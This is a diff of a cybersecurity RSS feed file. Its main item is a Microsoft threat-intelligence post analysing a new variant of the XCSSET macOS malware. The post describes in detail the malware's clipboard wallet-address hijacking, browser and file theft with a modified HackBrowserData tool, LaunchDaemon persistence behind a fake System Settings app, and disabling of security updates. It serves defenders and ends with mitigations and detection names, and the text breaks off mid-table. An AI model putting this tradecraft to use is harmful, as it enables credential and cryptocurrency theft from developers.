@@ -1,5 +1,555 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 25 Sep 2025 14:59:19 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Thursday, September 25th, 2025 https://isc.sans.edu/podcastdetail/9628</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Microsoft Unveils Microfluidic Cooling Breakthrough to Tame Overheating AI Chips</title><link>https://www.techrepublic.com/article/news-microsoft-microfluidic-cooling-ai-data-centers/</link><description>&lt;p&gt;Microsoft tests microfluidic cooling that removes heat three times better than cold plates, reducing GPU spikes and lowering energy consumption in AI data centers.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 25 Sep 2025 15:59:20 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Webshells Hiding in .well-known Places</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>XCSSET evolves again: Analyzing the latest updates to XCSSET’s inventory</title><link>https://www.microsoft.com/en-us/security/blog/2025/09/25/xcsset-evolves-again-analyzing-the-latest-updates-to-xcssets-inventory/</link><description>&lt;p&gt;Microsoft Threat Intelligence has uncovered a new variant of the XCSSET malware, which is designed to infect Xcode projects, typically used by software developers building Apple or macOS-related applications. &lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/09/25/xcsset-evolves-again-analyzing-the-latest-updates-to-xcssets-inventory/"&gt;XCSSET evolves again: Analyzing the latest updates to XCSSET’s inventory&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p class="wp-block-paragraph"&gt;Microsoft Threat Intelligence has identified yet another XCSSET variant in the wild that introduces further updates and new modules beyond those detailed in our &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/11/new-xcsset-malware-adds-new-obfuscation-persistence-techniques-to-infect-xcode-projects/"&gt;March 2025 blog post&lt;/a&gt;. The XCSSET malware is designed to infect Xcode projects, typically used by software developers, and&amp;nbsp;run while an Xcode project is being built. We assess that this mode of infection and propagation banks on project files being shared among developers building Apple or macOS-related applications.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This new variant of XCSSET brings key changes related to browser targeting, clipboard hijacking, and persistence mechanisms. It employs sophisticated encryption and obfuscation techniques, uses run-only compiled AppleScripts for stealthy execution, and expands its data exfiltration capabilities to include Firefox browser data. It also adds another persistence mechanism through &lt;em&gt;LaunchDaemon&lt;/em&gt; entries.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This variant features a submodule designed to monitor the clipboard and references a downloaded configuration file containing address regex patterns associated with various digital wallets. If a pattern match is detected, XCSSET is capable of substituting the clipboard content with its own predefined set of wallet addresses.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;In this blog, we will discuss the new modules added to the XCSSET’s inventory and key changes to existing ones. While we’re only seeing this new XCSSET variant in limited attacks as of this writing, we’re publishing our comprehensive analysis to increase awareness of this evolving threat. We shared these findings with Apple and collaborated with GitHub to take down repositories affected by XCSSET. This work reflects our broader commitment to disrupting attacks and dismantling attacker operations. Alongside our findings, we are sharing actionable detections, recommendations, and best practices to help organizations defend against this threat with confidence.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="analysis"&gt;Analysis&lt;/h2&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The latest XCSSET variant follows a four-stage infection chain. The initial three stages are consistent with those observed in previous variants, as described in our &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/11/new-xcsset-malware-adds-new-obfuscation-persistence-techniques-to-infect-xcode-projects/"&gt;previous blog&lt;/a&gt;. This analysis begins with the fourth stage, which includes the &lt;em&gt;boot()&lt;/em&gt; function and its associated calls to download and run submodules.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="boot-function-of-the-fourth-stage-script"&gt;boot() function of the fourth-stage script&lt;/h3&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The new variant introduces modifications to the boot function. These include additional checks for Firefox browser and modified logic for Telegram existence check. This stage also has multiple new modules that it downloads and executes.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Older variant:&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Screenshot of the boot function of the earlier XCSSET variant" class="wp-image-142583 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig1-XCSSET-boot-function-old-variant-1024x541.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1. &lt;em&gt;boot()&lt;/em&gt; function of the earlier variant&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;New variant:&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of the boot function of the latest XCSSET version" class="wp-image-142617 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig2-XCSSET-boot-function-new-variant-n.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2. &lt;em&gt;boot() &lt;/em&gt;function of the latest version&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;In the following sections, we examine changes to existing submodules as well as additional modules in this variant.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="vexyeqj-older-variant-seizecj-info-stealer"&gt;vexyeqj [Older variant: seizecj] (Info-stealer)&lt;/h3&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;In comparison to the previous variant, several commands in this script are commented out. Additionally, it downloads a module called &lt;em&gt;bnk&lt;/em&gt;, which is executed using osascript, with the domain supplied as a parameter. It then waits for three seconds and deletes the downloaded file.&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Screenshot of the main logic code of the Info-stealer module" class="wp-image-142618 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig3-XCSSET-main-logic-infostealer-n-1024x467.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3. Main logic of the Info-stealer submodule&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The &lt;em&gt;bnk&lt;/em&gt; file is a run-only compiled AppleScript. Direct decompilation of run-only compiled AppleScript is generally considered challenging or not feasible; however, the&lt;a href="https://github.com/Jinmo/applescript-disassembler"&gt; AppleScript disassembler project on Github&lt;/a&gt; can be used to disassemble the code for analysis.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The script defines several functions for purposes such as data validation, encryption, decryption, obtaining additional data from command and control (C2), and logging. The script is executed with the domain as its parameter.&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Screenshot of the disassembled code of the dec() function" class="wp-image-142627 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig4-XCSSET-Disassembled-code-n-1024x616.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4. Disassembled code of the &lt;em&gt;dec()&lt;/em&gt; function&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Above is a code snippet of the &lt;em&gt;dec()&lt;/em&gt; function, which is used to decrypt the data received from C2 server. Parsing the above leads to the command:&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of the parsed data from C2 server" class="wp-image-142600 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig4a-XCSSET.webp" /&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;In the referenced code, the encrypted data is stored in the variable &lt;em&gt;in&lt;/em&gt;. The first 32 characters of this variable are extracted to serve as the initialization vector (IV). The remaining data is then Base64-decoded and provided to the AES decryption function. In this case, the decryption key is a predefined constant, &lt;em&gt;27860c1670a8d2f3de7bbc74cd754121&lt;/em&gt;, which was established and computed within the main function.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The decoded blob appears to be a configuration file. Presented below is a formatted and redacted sample of the decrypted response obtained from the C2 server:&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of the configuration data from C2" class="wp-image-142620 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig5-XCSSET-Config-data-from-C2-n.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5. Configuration data received from the C2 server&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The following section examines the core logic of the downloaded &lt;em&gt;bnk&lt;/em&gt; payload, explaining how the previous information is interpreted and applied.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Firstly, it calls a defined function to obtain the configuration data from the C2 server; this data is decrypted and stored in a variable. Shell commands are executed to retrieve the &lt;em&gt;SerialNumber&lt;/em&gt; and the current user.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The clipboard content is retrieved which was determined by checking the AEVT &lt;a href="https://developer.apple.com/library/archive/releasenotes/AppleScript/ASTerminology_AppleEventCodes/TermsAndCodes.html"&gt;(Apple Event Code)&lt;/a&gt; codes. The process then identifies the frontmost application, which is checked against a blocklist defined by the “bad” property in the response from C2. Processing proceeds only if the current clipboard data differs from both the last clipboard entry and the last replaced clipboard data, the length of the clipboard data exceeds 25 characters, and the &lt;em&gt;oD()&lt;/em&gt; function does not return true. The &lt;em&gt;oD() &lt;/em&gt;function returns true when the first four characters are digits. After the above checks, it then has multiple gates and conditions. The first condition checks if the clipboard length is between 50 &amp;lt; &lt;em&gt;len(clipboard)&lt;/em&gt; &amp;lt; 300. It then checks if the clipboard matches the pattern defined in the &lt;em&gt;s&lt;/em&gt; record in the response. If it matches, the clipboard data is formatted in a record type string and is &lt;a&gt;exfiltrated&lt;/a&gt; to the C2 server. The transmitted data is also AES-encrypted.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;In the second condition, the script verifies whether the clipboard length is between 25 and 65, whether it was executed with a single argument, and whether &lt;em&gt;cD(clipboard_data)&lt;/em&gt; function returns a value greater than 1, which refers to the count of digits in the data passed in argument. If these conditions are met, the script iterates through the &lt;em&gt;sub&lt;/em&gt; collection in the C2 response, which includes individual entries for various wallets. Each &lt;em&gt;sub&lt;/em&gt; collection entry contains:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;a&lt;/em&gt;: Contains a list of addresses from which one is selected; the corresponding clipboard data is subsequently replaced.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;t&lt;/em&gt;: Refers to the wallet identifier.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;r&lt;/em&gt;: Specifies the regex pattern used for matching addresses associated with this wallet.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;ir&lt;/em&gt; (optional): Represents a negative regex pattern; addresses matching this pattern should be excluded.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;p&lt;/em&gt;: Appears to function as a counter or record index.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;For each record, it matches pattern for &lt;em&gt;r&lt;/em&gt; and &lt;em&gt;ir&lt;/em&gt;. If the variable &lt;em&gt;r&lt;/em&gt; is true and &lt;em&gt;ir&lt;/em&gt; is false, then the program checks whether the clipboard content matches any of the attacker’s addresses. If it does not, it selects an address from the list and replaces the clipboard&amp;#8217;s content accordingly. The system subsequently sends information—including the original clipboard data, the replaced data, the wallet name, frontmost application, and other relevant details—to the C2 server. Next, it assigns the value of the clipboard data to the &lt;em&gt;xcP&lt;/em&gt; variable, which tracks the most recently replaced clipboard entry. Finally, it updates the &lt;em&gt;xP&lt;/em&gt; variable to reflect the current clipboard text, waits for two seconds, and repeats the loop.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="neq-cdyd-ilvcmwx-file-stealer"&gt;neq_cdyd_ilvcmwx (File-stealer)&lt;/h3&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This module retrieves an additional script from the C2 server, which is saved in the &lt;em&gt;/tmp/ &lt;/em&gt;directory. The script is subsequently executed with the domain and &lt;em&gt;moduleName&lt;/em&gt; provided as parameters. After execution, the downloaded file is deleted. The module operates as a compiled, run-only AppleScript. The script bears similarity to the &lt;em&gt;txzx_vostfdi&lt;/em&gt; module, previously identified as a digital wallet data stealer targeting browsers. During analysis, the C2 server did not supply a folder list; however, it is capable of exfiltrating files back to the C2 server.&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Screenshot of additional downloaded script" class="wp-image-142621 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig6-Additional-script-downloaded-n-1024x73.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6. Additional script being downloaded and executed&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="xmyyeqjx-launchdaemon-based-persistence"&gt;xmyyeqjx (LaunchDaemon-based persistence)&lt;/h3&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This submodule sets up &lt;em&gt;LaunchDaemon&lt;/em&gt; persistence for the &lt;em&gt;~/.root &lt;/em&gt;file, which is created in this module. Here’s a summary of the script:&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The process begins by creating several paths and a &lt;em&gt;~/.root &lt;/em&gt;file in the user’s &lt;em&gt;HOME&lt;/em&gt; directory, which will contain the payload. The payload performs the following actions:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li class="wp-block-list-item"&gt;Changes the directory to &lt;em&gt;/Users/Shared&lt;/em&gt;&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Checks the network connection&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Retrieves the local signed-in user&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Sleeps for 30 seconds&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Executes the &lt;em&gt;~/.zshrc &lt;/em&gt;file in the context of the signed-in user (&lt;em&gt;.zshrc &lt;/em&gt;file was appended with malicious payload in previous submodules)&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Sleeps for 30 seconds&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Modifies two configurations to execute system commands that disable macOS automatic configuration updates and Rapid Security Response mechanisms.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of commands that modify Software Update preferences on macOS" class="wp-image-142601 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig6a-XCSSET.webp" /&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;These commands modify macOS Software Update preferences to disable various critical Apple Updates, including Rapid Security Responses (RSR), Security Configuration updates, and others.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;It then calls the &lt;em&gt;doMainFunc()&lt;/em&gt; function.&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Screenshot of function that creates fake application and download of additional script" class="wp-image-142628 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig7-Creation-of-fake-application-n-1024x643.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7. Creation of fake application and downloading of additional script from C2 server.&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This function first checks the existence of a &lt;em&gt;LaunchDaemon&lt;/em&gt; entry with the presence of &lt;em&gt;.root&lt;/em&gt; file in its contents. If it’s not found, it downloads another script from the C2 server, which is again a run-only compiled AppleScript. It then creates a fake application named S&lt;em&gt;ystem Settings.app&lt;/em&gt; in the &lt;em&gt;/tmp&lt;/em&gt; directory, which basically executes this downloaded AppleScript with two parameters. These parameters appear to be the &lt;em&gt;Label/Plist Name&lt;/em&gt; and the file to be persisted (&lt;em&gt;~/.root &lt;/em&gt;file).&amp;nbsp; After creating the fake app, it calls another function where it waits for the legitimate &lt;em&gt;System Settings&lt;/em&gt; application to get started, upon which it executes the fake application. This behavior is done to masquerade itself as legitimate.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The downloaded script first gets the device’s serial number and the current username by executing shell commands. It then forms path to the &lt;em&gt;LaunchDaemon&lt;/em&gt; plist file and constructs its content. It uses the echo command to paste this constructed content to the &lt;em&gt;LaunchDaemon&lt;/em&gt; file. The file name is the name that was passed in the argument. Below is an example of the created plist file:&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="Screenshot of plist content" class="wp-image-142622 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig8-XCSSET-plist-content-n-1024x47.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8. Plist content of the created LaunchDaemon entry&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;It masquerades with prefix &lt;em&gt;com.google&lt;/em&gt;&lt;em&gt;.&lt;/em&gt; in plist name and executes the &lt;em&gt;~/.root &lt;/em&gt;file using bash. The echo command is run using “do shell script …. with administrator privileges” which can be implied by the &lt;em&gt;badm&lt;/em&gt; AEVT code. It then executes &lt;em&gt;chown&lt;/em&gt; command to change owner to &lt;em&gt;root:wheel&lt;/em&gt; and sets 644 permissions to the plist file. Lastly, it executes the &lt;em&gt;launchctl load -w &lt;/em&gt;command with &lt;em&gt;sudo&lt;/em&gt; to start the daemon.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="jey-git-based-persistence"&gt;jey (Git-based persistence)&lt;/h3&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;The command in the older variant executes a direct concatenation of encrypted payload along with the repeated decryption command directly through the shell. In the new variant, the decryption logic is encapsulated within a shell function, which is defined inline and then used to decrypt the encrypted string before passing it to the shell for execution. This change primarily enhances the obfuscation method used by malware.&amp;nbsp;&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Old logic:&amp;nbsp;&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of payload generation logic in older variant" class="wp-image-142623 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig9-payload-generation-logic-old-variant-n.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9. Payload generation logic in older variant&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;New logic:&amp;nbsp;&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of payload generation logic in the latest XCSSET variant" class="wp-image-142624 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig10-payload-generation-logic-latest-variant-n.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10. Payload generation logic in the latest variant&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="iewmilh-cdyd-info-stealer-targeting-firefox"&gt;iewmilh_cdyd (Info-stealer targeting Firefox)&lt;/h3&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This new variant has added an info-stealer module to exfiltrate data stored by Firefox. The &lt;em&gt;runMe()&lt;/em&gt; function is invoked at first to download a Mach-O FAT binary, which is responsible for all info stealing operations, from the C2 server.&lt;/p&gt;
+
+
+&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-142625 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/09/Fig11-Dowloading-compiled-binary-n.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11. Downloading compiled binary of the HackBrowserData project&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This downloaded binary appears to be a modified version of a GitHub project &lt;a href="https://github.com/moonD4rk/HackBrowserData/tree/main"&gt;HackBrowserData&lt;/a&gt;, which is capable of decrypting and exporting browser data stored by browsers. Passwords, history, credit card information, and cookies are some of the key information it can extract from almost all popular browsers.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Upon downloading, the binary is given executable file permissions, is ad-hoc signed on the victim’s machine, and executed with &lt;em&gt;&amp;#8211;&lt;/em&gt;&lt;em&gt;b firefox -f json &amp;#8211;dir &amp;#8221; &amp;amp; resDir &amp;amp; &amp;#8221; –zip&lt;/em&gt; as arguments:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;-b&lt;/em&gt;: Browser name&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;-f&lt;/em&gt;: format of the output data&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;&amp;#8211;dir&lt;/em&gt;: Export directory where the output is stored&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;&lt;em&gt;&amp;#8211;zip&lt;/em&gt;: This flag stores the output in compressed ZIP&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Once all the data is retrieved, it uploads the compressed ZIP and log file to C2 server with its old method of exfiltrating data in chunks.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="mitigation-and-protection-guidance"&gt;Mitigation and protection guidance&lt;/h2&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Defenders can take the following mitigation steps to defend against this threat:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li class="wp-block-list-item"&gt;Run the latest version of your operating systems and applications. Deploy the latest security updates as soon as they become available.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Always inspect and verify Xcode projects downloaded or cloned from repositories, as the malware usually spreads through infected projects.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Exercise caution when copying and pasting sensitive data from the clipboard. Always verify that the pasted content matches the intended source to avoid falling victim to clipboard hijacking or data tampering attacks.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Encourage users to use web browsers that support&amp;nbsp;&lt;a href="https://learn.microsoft.com/deployedge/microsoft-edge-security-smartscreen"&gt;Microsoft Defender SmartScreen&lt;/a&gt;&amp;nbsp;like&amp;nbsp;&lt;a href="https://www.microsoft.com/edge"&gt;Microsoft Edge&lt;/a&gt;—available on macOS and various platforms—which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Use&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-endpoint/microsoft-defender-endpoint-mac"&gt;Microsoft Defender for Endpoint on Mac&lt;/a&gt;, which detects, stops, and quarantines the malware discussed in this blog&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Microsoft Defender for Endpoint customers can also apply the following mitigations to reduce the environmental attack surface and mitigate the impact of this threat and its payloads:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li class="wp-block-list-item"&gt;Turn on&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-endpoint/mac-preferences#cloud-delivered-protection-preferences"&gt;cloud-delivered protection&lt;/a&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-endpoint/mac-preferences#enable--disable-automatic-sample-submissions"&gt;automatic sample submission&lt;/a&gt;&amp;nbsp;on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Enable&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-endpoint/mac-pua"&gt;potentially unwanted application (PUA) protectio&lt;/a&gt;n in block mode to automatically quarantine PUAs like adware. PUA blocking takes effect on endpoint clients after the next signature update or computer restart. PUA blocking takes effect on endpoint clients after the next signature update or computer restart.&lt;/li&gt;
+
+
+
+&lt;li class="wp-block-list-item"&gt;Turn on&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-endpoint/network-protection"&gt;network protection&lt;/a&gt;&amp;nbsp;to block connections to malicious domains and IP addresses.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="microsoft-defender-xdr-detections"&gt;Microsoft Defender XDR detections&lt;/h2&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Tactic&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Observed activity&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Microsoft Defender coverage&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Initial access&lt;/td&gt;&lt;td&gt;&amp;#8211; Malicious Xcode projects&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Microsoft Defender Antivirus&lt;/strong&gt; &lt;br /&gt;&amp;#8211; Trojan:MacOS/XCSSET.PB &lt;br /&gt;&lt;br /&gt;&lt;strong&gt;Microsoft Defender for Endpoint&lt;/strong&gt; &lt;br /&gt;&amp;#8211; Possible XCSSET activity&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Execution&lt;/td&gt;&lt;td&gt;&amp;#8211; Malicious command execution &lt;br /&gt;&amp;#8211; Malicious file execution &lt;br /&gt;&amp;#8211; Malicious osascript execution&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Microsoft Defender Antivirus&lt;/strong&gt; &lt;br /&gt;&amp;#8211; Behaviour:MacOS/SuspOsascriptExec.B &lt;br /&gt;&amp;#8211; Behaviour:MacOS/SuspOsascriptExec.C &lt;br /&gt;&amp;#8211; Trojan:MacOS/XCSSET.AB &lt;br /&gt;&amp;#8211; Trojan:MacOS/XCSSET.BA &lt;br /&gt;&amp;#8211; Trojan:MacOS/XCSSET.SE &lt;br /&gt;&amp;#8211; Behavior:MacOS/SuspXcssetBehavior.AT &lt;br /&gt;&amp;#8211; Trojan:MacOS/XCSSET.ST &lt;br /&gt;&amp;#8211; Trojan:MacOS/XCSSET.SB &lt;br /&gt;&amp;#8211; Trojan:MacOS/XCSSET.SC &amp;nbsp; &lt;br /&gt;&lt;br /&gt;&lt;strong&gt;Microsoft Defender for Endpoint&lt;/strong&gt; &lt;br /&gt;&amp;#8211; Suspicious file dropped and launched &lt;br /&gt;&amp;#8211; Suspicious script launched &lt;br /&gt;&amp;#8211; Network connection by osascript &lt;br /&gt;&amp;#8211; Suspicious process launched from a world-writable directory&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Persistence&lt;/td&gt;&lt;td&gt;&amp;#8211; Hidden &lt;em&gt;LaunchDaemon&lt;/em&gt; persistence&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Microsoft Defender Antivirus&lt;/strong&gt; &lt;br /&gt;&amp;#8211; Behavior:MacOS/SuspHiddenPersistence.A1 &amp;nbsp; &lt;br /&gt;&lt;br /&gt;&lt;strong&gt;Microsoft Defender for Endpoint&lt;/strong&gt; &lt;br /&gt;&amp;#8211; Suspicious Plist modifications &amp;#8211; Suspicious launchctl tool activity&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Defense evasion&lt;/td&gt;&lt;td&gt;&amp;#8211; Suspicious obfuscated command&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Microsoft Defender for Endpoint&lt;/strong&gt; &lt;br /&gt;&lt;strong&gt;&amp;#8211; &lt;/strong&gt;Suspicious file or information obfuscation detected&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Credential access&lt;/td&gt;&lt;td&gt;&amp;#8211; Use of modified HackBrowserData 